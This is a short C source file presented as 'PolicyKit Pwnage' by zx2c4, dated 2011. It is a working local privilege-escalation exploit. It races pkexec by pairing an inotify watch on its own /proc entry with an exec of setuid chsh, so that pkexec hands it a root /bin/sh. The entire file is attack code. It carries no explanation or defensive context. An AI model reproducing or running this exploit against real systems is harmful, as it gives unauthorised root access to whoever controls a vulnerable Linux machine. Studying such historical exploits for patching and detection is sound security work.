

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/inotify.h>

int main(int argc, char **argv)
{
	printf("=============================\n");
	printf("=      PolicyKit Pwnage     =\n");
	printf("=          by zx2c4         =\n");
	printf("=        Sept 2, 2011       =\n");
	printf("=============================\n\n");

	if (fork()) {
		int fd;
		char pid_path[1024];
		sprintf(pid_path, "/proc/%i", getpid());
		printf("[+] Configuring inotify for proper pid.\n");
		close(0); close(1); close(2);
		fd = inotify_init();
		if (fd < 0)
			perror("[-] inotify_init");
		inotify_add_watch(fd, pid_path, IN_ACCESS);
		read(fd, NULL, 0);
		execl("/usr/bin/chsh", "chsh", NULL);
	} else {
		sleep(1);
		printf("[+] Launching pkexec.\n");
		execl("/usr/bin/pkexec", "pkexec", "/bin/sh", NULL);
	}
	return 0;
}
